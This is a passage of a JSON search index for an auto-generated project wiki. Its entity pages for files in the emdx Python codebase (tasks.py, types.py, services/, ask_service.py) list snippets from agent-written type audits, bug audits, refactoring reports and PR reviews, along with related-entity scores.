<p><code>emdx/models/types.py</code> (TypedDict definitions)</p> </li> <li> <p>#6428 Add TaskDict TypedDicts to models layer   Section: Add TypedDict definitions to models layer</p> <p>...Changed</p> </li> <li>NEW: <code>emdx/models/types.py</code> - TypedDict definitions</li> <li>MODIFIED: <code>emdx/models/tasks.py</code> - 15 functions updated</li> <li>MODIFIED: <code>emdx/models/categories.py</code> - 2 functions updated  </li> <li> <p>MODIFIED: <code>emdx/models/tags.py</code> - 2 functions updated</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Scope of Changes</p> Module Functions Found Priority <code>emdx/models/tasks.py</code> 13 functions Critical <code>emdx/database/documents.py</code> 12 functions High <code>emdx/database/cascade.py</code> 7 functions High `emdx/database/... </li> <li> <p>#6406 Bug Fix PR Reviews [synthesis]   Section: Blocking (Must Fix Before Merge)</p> <p>PR #594: Add <code>error</code> to <code>ALLOWED_UPDATE_COLUMNS</code> in <code>emdx/models/tasks.py</code>: ```python ALLOWED_UPDATE_COLUMNS = frozenset({     \"title\", \"description\", \"priority\", \"status\", \"gameplan_id\", \"project\",     \"prompt\", \"type\", \"execution_id\", \"o...</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: Required Fix</p> <p>Add <code>'error'</code> to ALLOWED_UPDATE_COLUMNS in <code>emdx/models/tasks.py</code>: ```python ALLOWED_UPDATE_COLUMNS = frozenset({     'title', 'description', 'priority', 'status', 'gameplan_id', 'project',     'prompt', 'type', 'execution_id', 'o...</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 9. MEDIUM: Missing Index for Common Queries**</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>1. Tasks Table (<code>emdx/models/tasks.py</code>)</p> </li> <li>Primary entity for tracking work items</li> <li>Supports hierarchy via <code>parent_task_id</code> for grouped operations</li> <li> <p>Status workflow: <code>open</code> \u2192 <code>active</code> \u2192 <code>done</code> | `failed...</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: Overview</p> <p>...odels/task_executions.py`) - Task-to-execution linking </p> </li> <li> <p><code>tasks</code> table (via <code>emdx/models/tasks.py</code>) - High-level delegate task tracking</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Files Examined</p> <p>...s (NOT tasks) | | <code>emdx/commands/tasks.py</code> | CLI commands for task management | | <code>emdx/models/tasks.py</code> | Task CRUD operations |</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]</p> <p>tasks - Core task records with workflow/delegate tracking</p> </li> <li>task_executions - Join table linking tasks to execution records</li> </ul>"},{"location":"entities/emdxmodelstaskspy/#1-emdxmodelstaskspy","title":"1. <code>emdx/models/tasks.py</code>","text":"<p>Added <code>get_recent_failures()</code> function after the existing <code>get_failed_tasks()</code>:</p>"},{"location":"entities/emdxmodelstaskspy/#files-analyzed","title":"Files Analyzed","text":""},{"location":"entities/emdxmodelstaskspy/#9a-tasks-by-output_doc_id","title":"9a. Tasks by output_doc_id","text":"<p><code>emdx/models/tasks.py</code> doesn't have common queries for finding tasks by their output document, but the schema has this index (migration 034). Good.</p>"},{"location":"entities/emdxmodelstaskspy/#task-model-emdxmodelstaskspy","title":"Task Model (<code>emdx/models/tasks.py</code>)","text":""},{"location":"entities/emdxmodelstaskspy/#task-fields","title":"Task Fields","text":"<p>| Field | Type | Default | Description | |-------|----...</p> <ul> <li>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Current State </li> <li>Purpose: Track work items with dependencies</li> <li>Statuses: open, active, blocked, done, failed</li> <li> <p>Execution model: DAG-based wi...</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: EMDX Task CLI Commands Analysis</p> <p>File: <code>emdx/commands/tasks.py</code> (358 lines) Model: <code>emdx/models/tasks.py</code> (309 lines) Task Runner: <code>emdx/services/task_runner.py</code> (150 lines)</p> </li> </ul>"},{"location":"entities/emdxmodelstaskspy/#task-system-emdxmodelstaskspy-emdxcommandstaskspy","title":"Task System (<code>emdx/models/tasks.py</code>, <code>emdx/commands/tasks.py</code>)","text":""},{"location":"entities/emdxmodelstaskspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/models/categories.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>epicviewdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.0)</li> <li><code>get_failed_tasks()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>emdx/commands/review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>open</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.6)</li> <li><code>manual</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.6)</li> <li><code>get_ready_tasks()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.5)</li> <li><code>emdx/models/executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=4.4)</li> <li><code>emdx/utils/output.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.3)</li> <li><code>emdx/models/task_executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.3)</li> </ul>"},{"location":"entities/emdxmodelstypespy/","title":"emdx/models/types.py","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/emdxmodelstypespy/#documents-9","title":"Documents (9)","text":"<ul> <li>#6509 Any Type Removal Analysis [synthesis]   Section: Common Themes <p>Recommendation: Create TypedDicts in <code>emdx/ui/types.py</code> or <code>emdx/models/types.py</code>:</p> </li> <li><code>DocumentDict</code></li> <li><code>ExecutionData</code></li> <li><code>GroupDict</code></li> <li><code>CascadeRunDict</code></li> <li> <p><code>TagInfo</code></p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Recommended Shared Type Locations</p> <p>...s.py<code>(new) |</code>VimEditorHost<code>,</code>SelectionModeHost<code>,</code>DocumentServiceProtocol<code>| |</code>emdx/models/types.py<code>(existing) |</code>TagCountDict<code>,</code>TaskUpdateKwargs<code>,</code>ExecutionUpdateKwargs<code>| |</code>emdx/database/types.py<code>(new or existing) |</code>GroupUpdateKwargs<code>,</code>CompactDocumentRow`...</p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: Implementation Notes</p> <ol> <li>TypedDict imports: Add to <code>emdx/models/types.py</code> for reusability</li> </ol> </li> <li>ParamSpec: Requires Python 3.10+ (already satisfied by 3.11 requirement)</li> <li> <p>Unpack: Requires Python 3.12 or `from typing_extensions impor...</p> </li> <li> <p>#6498 None Type Analysis [4/7]   Section: None Type Annotation Analysis: Model Files [4/7]</p> </li> <li><code>emdx/models/tasks.py</code></li> <li><code>emdx/models/executions.py</code></li> <li><code>emdx/models/tags.py</code></li> <li><code>emdx/models/categories.py</code></li> <li> <p><code>emdx/models/types.py</code> (TypedDict definitions)</p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]   Section: Priority 2: Create TypedDicts</p> <p>Add to <code>emdx/models/types.py</code>:</p> </li> <li> <p>#6486 Any Type Removal Analysis [2/5]   Section: Priority 1: Define Missing Types (High Impact)</p> <ol> <li>Create <code>TagInfo</code> TypedDict in <code>emdx/models/types.py</code>:</li> </ol> </li> </ul> <pre><code>class TagInfo(TypedDict):\n    name: str\n    count: int\n    emoji: str | None\n</code></pre> <ul> <li> <p>#6428 Add TaskDict TypedDicts to models layer   Section: Add TypedDict definitions to models layer</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Actionable Items</p> <ol> <li>Create <code>emdx/database/types.py</code> with all database TypedDicts</li> </ol> </li> <li>Create <code>emdx/models/types.py</code> with all model TypedDicts</li> <li>Start with TaskDict \u2014 highest ROI, used everywhere</li> <li>Use <code>from __future__ import annotations</code> for forward references</li> <li> <p>**Ad...</p> </li> <li> <p>#6440 Remove unused kwargs and tighten SQL param types   Section: Changes Made</p> <p>...atabase/search.py:search_documents** \u2014 Added <code>| None</code> to existing param type</p> </li> <li>emdx/models/types.py \u2014 Added <code>ExecutionStatsDict</code> TypedDict</li> <li>emdx/models/executions.py:get_execution_stats \u2014 Changed return type to <code>ExecutionStatsDict</code></li> <li>**emdx/models/tags.p...</li> </ul>"},{"location":"entities/emdxmodelstypespy/#files-analyzed","title":"Files Analyzed","text":""},{"location":"entities/emdxmodelstypespy/#summary","title":"Summary","text":"<p>Created <code>emdx/models/types.py</code> with TypedDict definitions and updated return type annotations in <code>tasks.py</code>, <code>categories.py</code>, and <code>tags.py</code>.</p>"},{"location":"entities/emdxmodelstypespy/#related-entities","title":"Related Entities","text":"<ul> <li><code>documentdict</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>update functions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>taskstatus</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>taginfo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>misc files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>low priority (acceptable as-is)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>kwargs: any)</code> | `` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>keybindingregistry</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>json output functions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>intermediate variables</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/emdxservices/","title":"emdx/services/","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxservices/#documents-12","title":"Documents (12)","text":"<ul> <li>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/emdxservices/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Summary</p> <p>Audited every public function/method across 24 files in <code>emdx/services/</code> (+ 4 in <code>cli_executor/</code>). Checked each against the full codebase (excluding the defining file and <code>tests/</code>).</p> <ul> <li>#6720 wiki-privacy-research   Section: 1a. Sensitive Data Redaction <p>```python</p> </li> </ul>"},{"location":"entities/emdxservices/#emdxserviceswiki_filterspy","title":"emdx/services/wiki_filters.py","text":"<ul> <li>#6583 Delegate synthesis [synthesis]   Section: New TypedDicts to Create <p>Add to <code>emdx/services/types.py</code>:</p> </li> <li><code>SynthesisInputDocument</code> (id, title, content)</li> <li><code>CostEstimate</code> (input_tokens, output_tokens, estimated_cost)</li> <li> <p><code>TaskSyncResult</code> (success, output?, error?, exit_code?) \u2014 <code>total=False</code></p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: Recommended TypedDicts to create</p> <p>Add to <code>emdx/services/types.py</code>:</p> </li> <li> <p>#6574 Delegate synthesis [synthesis]   Section: Key Findings</p> </li> <li> <p>#6572 Delegate: List the 3 most important files in emdx/services/ and say on [2/2]   Section: 3 Most Important Files in emdx/services/</p> <p>Based on reviewing the 22 Python files in <code>emdx/services/</code>, here are the 3 most important:</p> </li> <li> <p>#6434 Any/None typing audit [4/5]   Section: Any Type Audit: emdx/services/</p> </li> <li> <p>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4]   Section: Type System Audit: Replace Any/None with Concrete Types</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: Module-Specific Summaries</p> </li> <li>15 issues (4 critical, 6 medium)</li> <li> <p>Primary concerns: resource leaks, thread safety, infinite loops</p> </li> <li> <p>#6375 Codebase Bug Audit 2026-02-15 [3/10]   Section: EMDX Services Bug Audit Report</p> <p>Date: 2026-02-15 Scope: <code>emdx/services/</code> and <code>emdx/services/cli_executor/</code> Auditor: Claude Code</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udd34 Critical Issues</p> </li> </ul>"},{"location":"entities/emdxservices/#services-layer-emdxservices","title":"Services Layer (<code>emdx/services/</code>)","text":"<p>The business logic that powers the commands:</p>"},{"location":"entities/emdxservices/#summary","title":"Summary","text":"<p>Audited 14 files in <code>emdx/services/</code> for unnecessary <code>Any</code> usage in function signatures and return types.</p>"},{"location":"entities/emdxservices/#overview","title":"Overview","text":"<p>This audit identifies function parameters and return types using <code>Any</code>, <code>dict[str, Any]</code>, or <code>Optional[Any]</code> in <code>emdx/commands/</code> and <code>emdx/services/</code>. For each, I analyze actual usage to determine the proper concrete type.</p>"},{"location":"entities/emdxservices/#services-emdxservices","title":"Services (<code>emdx/services/</code>)","text":""},{"location":"entities/emdxservices/#2-deprecated-function-still-in-use","title":"2. Deprecated Function Still in Use","text":"<p>Location: <code>emdx/services/claude_executor.py:398</code> Impact: API inconsistency, maintenance burden</p>"},{"location":"entities/emdxservices/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/commands/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>unified_executor.py:192</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>synthesisinputdocument</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>synthesis_service.py:390</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>synthesis_service.py:223</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>synthesis_service.py:140</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>execute_task_sync()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>distill_single()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>costestimate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>claude_executor.py:241</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/emdxservicesaskservicepy/","title":"emdx/services/ask_service.py","text":"<p>Type: heading | Mentioned in: 28 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxservicesaskservicepy/#documents-28","title":"Documents (28)","text":"<ul> <li>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4] <p><code>get_popular_tags(...) -&gt; list[dict[str, Any]]</code></p> </li> <li>Location: Line 518</li> <li>Current Type: <code>list[dict[str, Any]]</code></li> <li>Actual Type: Create TypedDict <code>TagCount</code> with fields: <code>name: str, count: int</code></li> <li> <p>Rationale: Returns tag name and usage count....</p> </li> <li> <p>#6616 Delegate: Remove the emoji alias system from emdx. This is a big-bang    Section: Changes Made</p> <p>...<code>emdx/services/auto_tagger.py</code> \u2014 Removed EMOJI_ALIASES lookup, use tag directly</p> </li> <li><code>emdx/services/ask_service.py</code> \u2014 Replaced normalize_tag_to_emoji with simple .strip().lower()</li> <li> <p><code>emdx/services/unified_search.py</code> \u2014 Removed lazy import of normalize_tag_to_emoji</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 4. <code>normalize_tag_to_emoji</code> (function)</p> <p>...<code>emdx/models/tags.py</code> | 230 | Usage: Normalize tags in <code>list_all_tags()</code> | | <code>emdx/services/ask_service.py</code> | 19 | Import: <code>from ..utils.emoji_aliases import normalize_tag_to_emoji</code> | | <code>emdx/services/ask_service.py</code> | 217 | Usage: Normalize tag filters in AskServ...</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: Implementation Plan</p> <p>...dx/services/unified_search.py<code>\u2014 remove</code>normalize_tag_to_emoji()` call</p> </li> <li> <p>Update <code>emdx/services/ask_service.py</code> \u2014 remove <code>normalize_tag_to_emoji()</code> call</p> </li> <li> <p>#6525 Delegate: FEAT-7 Ask-KB Improvements Implementation   Section: Phase 1: Core Filters</p> <p>Files Modified:</p> </li> <li><code>emdx/commands/ask.py</code> - Added CLI options</li> <li> <p><code>emdx/services/ask_service.py</code> - Added filter helper</p> </li> <li> <p>#6523 Gameplan: FEAT-7 Ask-KB Improvements   Section: Phase 1: Core Filters (HIGH priority)</p> <p>...emdx/commands/ask.py`</p> </li> <li>Create <code>_add_filters(query, tags, recent_days)</code> helper in <code>emdx/services/ask_service.py</code></li> <li>Filter docs by joining <code>document_tags</code> table</li> <li> <p>Use <code>normalize_tag_to_emoji()</code> from <code>emdx/utils/emoji_aliases.py</code> for alias resolution</p> </li> <li> <p>#6521 Delegate synthesis [synthesis]   Section: Files to Modify</p> <p>...| | <code>emdx/commands/ask.py</code> | Add <code>--tags</code>, <code>--recent</code> options, update display | | <code>emdx/services/ask_service.py</code> | Add <code>_add_filters()</code> helper, enhance <code>Answer</code> dataclass | | <code>tests/test_prime.py</code> | Port smart priming tests | | <code>tests/test_ask.py</code> | Create new file with ask fe...</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: Files to Modify</p> <ol> <li><code>emdx/commands/ask.py</code> \u2014 Add options, update display</li> </ol> </li> <li><code>emdx/services/ask_service.py</code> \u2014 Add filter helper, update Answer dataclass, enhance methods</li> <li> <p><code>tests/test_ask.py</code> \u2014 Create new test file (port from PR #453 with updates)</p> </li> <li> <p>#6518 Any removal Phase 1: Quick wins   Section: 4. Removed unused <code>Any</code> imports</p> <p>.../modals.py` - doc data dict</p> </li> <li><code>emdx/ui/log_browser.py</code> - log browser subscriber</li> <li> <p><code>emdx/services/ask_service.py</code> - Anthropic client, embedding service</p> </li> <li> <p>#6490 Any Type Removal Analysis [4/5]   Section: Summary</p> <p>Analysis of <code>Any</code> type annotations in four services files:</p> </li> <li><code>emdx/services/ask_service.py</code> - 6 occurrences</li> <li><code>emdx/services/unified_search.py</code> - 4 occurrences</li> <li><code>emdx/services/file_watcher.py</code> - 2 occurrences</li> <li> <p><code>emdx/services/embedding_service.py</code> - 2 occ...</p> </li> <li> <p>#6484 Any Type Removal Analysis [4/5]</p> </li> </ul>"},{"location":"entities/emdxservicesaskservicepy/#any-type-removal-analysis-45","title":"Any Type Removal Analysis [4/5]","text":""},{"location":"entities/emdxservicesaskservicepy/#overview","title":"Overview","text":"<p>Analysis of <code>Any</code> type annotations in Services files with specific replacement recommendations. ---</p>"},{"location":"entities/emdxservicesaskservicepy/#file-emdxservicesask_servicepy","title":"File: <code>emdx/services/ask_service.py</code>","text":""},{"location":"entities/emdxservicesaskservicepy/#1-line-13-from-typing-import-any","title":"1. Line 13: <code>from typing import Any</code>","text":"<p>Usage Context: I...</p> <ul> <li>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files </li> <li><code>emdx/services/ask_service.py</code> - Uses DEFAULT_ASK_MODEL</li> <li><code>emdx/services/cascade_service.py</code> - Uses CASCADE_*_TIMEOUT_SECONDS</li> <li> <p><code>emdx/services/claude_executor.py</code> - Uses DEFAULT_CLI_TIMEOUT_SECON...</p> </li> <li> <p>#6421 Delegate: Research upgrading the anthropic Python SDK from 0.40.0 to 0 [2/5]   Section: Current Usage in EMDX</p> <p>Files using anthropic:</p> </li> <li><code>emdx/services/ask_service.py</code> - Main API usage</li> <li> <p><code>emdx/utils/claude_wrapper.py</code> - Doesn't import anthropic directly (wrapper for CLI)</p> </li> <li> <p>#6362 Delegate: DEBT-5: Fix silent exception handlers in the emdx codebase.  [2/3]   Section: DEBT-5: Fix Silent Exception Handlers</p> <p>...in auto-run</p> </li> <li><code>emdx/commands/recipe.py</code> - ValueError on non-numeric ID lookup</li> <li><code>emdx/services/ask_service.py</code> - ValueError on invalid doc ID format</li> <li><code>emdx/services/cascade_service.py</code> - ProcessLookupError on already-exited process</li> <li> <p><code>emdx/ui/activity/activity_data.py</code> -...</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: 2. Updated files to use centralized constants:</p> <p>...stants | | <code>emdx/services/unified_executor.py</code> | Use CLI_SYNC_DEFAULT_TIMEOUT | | <code>emdx/services/ask_service.py</code> | Use DEFAULT_CLAUDE_SONNET_MODEL | | <code>emdx/config/cli_config.py</code> | Use DEFAULT_CLAUDE_MODEL, DEFAULT_CLAUDE_SONNET_MODEL, ENV_CLI_TOOL | | `emdx/services/cli_execu...</p> </li> <li> <p>#6288 Delegate: DEBT-13: Add retry logic for network/IO operations   Section: Changes Made</p> </li> <li>Created <code>_call_claude_api()</code> helper method with retry logic</li> <li>Retries on: <code>APIConnectionError</code>, <code>RateLimitError</code>, <code>InternalServerError</code></li> <li> <p>Updated `_generate_answ...</p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> <p>...constants</p> </li> <li><code>emdx/models/executions.py</code> - Uses STALE_EXECUTION_TIMEOUT_SECONDS</li> <li><code>emdx/services/ask_service.py</code> - Uses DEFAULT_CLAUDE_FAST_MODEL</li> <li><code>emdx/services/cascade_service.py</code> - Uses CASCADE_*_TIMEOUT_SECONDS</li> <li> <p><code>emdx/services/claude_executor.py</code> - Uses DEFAULT_TIMEOUT_S...</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 4. Files Updated to Use Centralized Constants</p> <p>...- Uses <code>PROCESS_*_TIMEOUT</code></p> </li> <li><code>emdx/config/cli_config.py</code> - Uses model constants</li> <li><code>emdx/services/ask_service.py</code> - Uses <code>DEFAULT_ASK_MODEL</code></li> <li><code>emdx/services/cli_executor/claude.py</code> - Uses <code>CLI_VERSION_CHECK_TIMEOUT</code></li> <li> <p><code>emdx/services/cli_executor/cursor.py</code> - Uses `CLI_*_TIMEOU...</p> </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Files Modified</p> <p>...tants.py` (+118 lines)</p> </li> <li><code>emdx/config/cli_config.py</code> (use centralized models)</li> <li><code>emdx/services/ask_service.py</code> (use centralized constants)</li> <li><code>emdx/commands/delegate.py</code> (use timeout/branch constants)</li> <li><code>emdx/utils/git.py</code> (add get_default_branch())</li> <li> <p>`emdx/commands/core.p...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 3. Overly Broad Exception Catches (60+ instances)</p> <p>API Calls (should catch specific API errors):</p> </li> <li><code>emdx/services/ask_service.py:296-300,358-367</code> - Already partially typed but re-raises unknown errors</li> <li> <p><code>emdx/services/unified_search.py:346,363</code> - Semantic search failures</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udfe1 MEDIUM: Missing Exception Chaining (raise from)</p> <p>...tError re-raise | | <code>emdx/services/similarity.py</code> | 35 | ImportError re-raise | | <code>emdx/services/ask_service.py</code> | 52 | ImportError re-raise | | <code>emdx/prompts/__init__.py</code> | 11 | ValueError for missing template | | <code>emdx/utils/lazy_group.py</code> | 135 | ValueError for invalid comm...</p> </li> <li> <p>#6187 Delegate: Fix PR #453 (Ask the KB). Checkout branch feat/ask-kb. Revie [2/2]   Section: Changes</p> <ul> <li><code>emdx/services/ask_service.py</code>: Refactored with module-level <code>_add_filters()</code> helper</li> </ul> </li> <li> <p><code>tests/test_ask.py</code>: New file with 21 unit tests</p> </li> <li> <p>#6151 Delegate: Review PR #453 (Ask the KB). Run: gh pr diff 453. Check code [6/7]   Section: Test Coverage</p> </li> <li><code>emdx/commands/ask.py</code>: +53 lines (new CLI options, machine output)</li> <li><code>emdx/services/ask_service.py</code>: +127 lines, -56 lines (filtering, citations, prompts)</li> <li> <p>Total: 2 files, +180/-56 lines</p> </li> <li> <p>#6144 Delegate: Read gameplan by running: emdx view 6103. Implement the Ask  [7/7]   Section: Ask the KB Feature Implementation Complete</p> </li> <li>Updated <code>emdx/commands/ask.py</code> \u2014 added new CLI options and output formatting</li> <li> <p>Updated <code>emdx/services/ask_service.py</code> \u2014 added filtering logic and enhanced Answer dataclass</p> </li> <li> <p>#6354 Delegate: Rebase the feat/ask-kb branch onto main and resolve all merg [4/5]   Section: Rebase Result: feat/ask-kb onto main (PR #453)</p> </li> <li>emdx/commands/ask.py - Type hint style conflict (Optional[str] vs str | None) and new filter parameters</li> <li> <p>emdx/services/ask_service.py - Same type hint conflict plus new parameters</p> </li> <li> <p>#6341 Delegate: R4: Centralize configuration constants. Create emdx/constant   Section: Changes Made</p> <p>...de.py** - Uses DEFAULT_CLI_TIMEOUT_SECONDS and IMPLEMENTATION_TIMEOUT_SECONDS</p> </li> <li>emdx/services/ask_service.py - Uses DEFAULT_ASK_MODEL instead of hardcoded string</li> <li>emdx/config/cli_config.py - Uses CLAUDE_OPUS_MODEL and CLAUDE_SONNET_MODEL</li> <li>**emdx/services/claude_ex...</li> </ul>"},{"location":"entities/emdxservicesaskservicepy/#service-layer","title":"Service Layer","text":""},{"location":"entities/emdxservicesaskservicepy/#3-added-retry-to-anthropic-api-calls-emdxservicesask_servicepy","title":"3. Added retry to Anthropic API calls (<code>emdx/services/ask_service.py</code>)","text":""},{"location":"entities/emdxservicesaskservicepy/#changes-summary","title":"Changes Summary","text":""},{"location":"entities/emdxservicesaskservicepy/#changes-made","title":"Changes Made","text":""},{"location":"entities/emdxservicesaskservicepy/#conflicts-resolved","title":"Conflicts Resolved","text":"<p>Two files had merge conflicts:</p>"},{"location":"entities/emdxservicesaskservicepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tests/test_ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>normalize_tag_to_emoji()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>emdx/services/auto_tagger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> <li><code>--recent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> <li><code>source_titles: list[tuple[int, str]]</code> 